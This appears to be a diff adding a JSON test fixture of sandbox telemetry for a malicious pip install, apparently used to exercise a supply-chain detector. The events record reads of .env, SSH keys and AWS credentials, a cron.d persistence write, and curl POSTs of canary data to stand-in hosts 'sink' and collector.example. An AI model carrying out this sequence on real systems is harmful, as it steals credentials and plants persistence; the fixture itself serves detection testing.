@@ -1,0 +1,170 @@
+[
+  {
+    "ts": 1732350000.001,
+    "source": "strace",
+    "type": "exec",
+    "pid": 101,
+    "process": "pip",
+    "detail": {"cmdline": ["pip", "install", "fixture-pkg"]}
+  },
+  {
+    "ts": 1732350000.101,
+    "source": "gateway",
+    "type": "dns",
+    "pid": 101,
+    "process": "pip",
+    "detail": {"host": "pypi.org"}
+  },
+  {
+    "ts": 1732350000.201,
+    "source": "gateway",
+    "type": "net_connect",
+    "pid": 101,
+    "process": "pip",
+    "detail": {"host": "pypi.org", "port": 443}
+  },
+  {
+    "ts": 1732350000.301,
+    "source": "gateway",
+    "type": "http_request",
+    "pid": 101,
+    "process": "pip",
+    "detail": {"method": "GET", "url": "https://pypi.org/simple/fixture-pkg"}
+  },
+  {
+    "ts": 1732350001.001,
+    "source": "strace",
+    "type": "file_read",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"path": "/home/sandbox/.env"}
+  },
+  {
+    "ts": 1732350001.101,
+    "source": "strace",
+    "type": "file_read",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"path": "/home/sandbox/.ssh/id_rsa"}
+  },
+  {
+    "ts": 1732350001.201,
+    "source": "strace",
+    "type": "file_read",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"path": "/home/sandbox/.aws/credentials"}
+  },
+  {
+    "ts": 1732350001.301,
+    "source": "strace",
+    "type": "file_write",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"path": "/home/sandbox/.cache/exfil.txt"}
+  },
+  {
+    "ts": 1732350001.401,
+    "source": "strace",
+    "type": "file_write",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"path": "/etc/cron.d/fixture"}
+  },
+  {
+    "ts": 1732350001.501,
+    "source": "strace",
+    "type": "exec",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"cmdline": ["curl", "-X", "POST", "http://sink/upload"]}
+  },
+  {
+    "ts": 1732350001.601,
+    "source": "strace",
+    "type": "exec",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"cmdline": ["sh", "-c", "cat /home/sandbox/.env"]}
+  },
+  {
+    "ts": 1732350001.701,
+    "source": "strace",
+    "type": "net_connect",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"host": "10.0.0.2", "port": 8080}
+  },
+  {
+    "ts": 1732350001.801,
+    "source": "gateway",
+    "type": "dns",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"host": "collector.example"}
+  },
+  {
+    "ts": 1732350001.901,
+    "source": "gateway",
+    "type": "http_request",
+    "pid": 202,
+    "process": "python3",
+    "detail": {
+      "method": "POST",
+      "url": "http://collector.example/upload",
+      "body_excerpt": "CANARY_ENV_7f3a"
+    }
+  },
+  {
+    "ts": 1732350002.001,
+    "source": "gateway",
+    "type": "http_request",
+    "pid": 202,
+    "process": "python3",
+    "detail": {
+      "method": "POST",
+      "url": "http://collector.example/upload",
+      "body_excerpt": "Q0FOQVJZX0VOVl83ZjNh"
+    }
+  },
+  {
+    "ts": 1732350002.101,
+    "source": "gateway",
+    "type": "http_request",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"method": "GET", "url": "http://collector.example/ping"}
+  },
+  {
+    "ts": 1732350002.201,
+    "source": "fsdiff",
+    "type": "file_write",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"path": "/work/package/output.txt"}
+  },
+  {
+    "ts": 1732350002.301,
+    "source": "strace",
+    "type": "exec",
+    "pid": 303,
+    "process": "python3",
+    "detail": {"cmdline": ["openssl", "enc", "-base64"]}
+  },
+  {
+    "ts": 1732350002.401,
+    "source": "strace",
+    "type": "resource_limit",
+    "pid": 202,
+    "process": "python3",
+    "detail": {"resource": "pids", "limit": 128, "observed": 128}
+  },
+  {
+    "ts": 1732350002.501,
+    "source": "strace",
+    "type": "file_read",
+    "pid": 101,
+    "process": "pip",
+    "detail": {"path": "/work/package/setup.py"}
+  }
+]
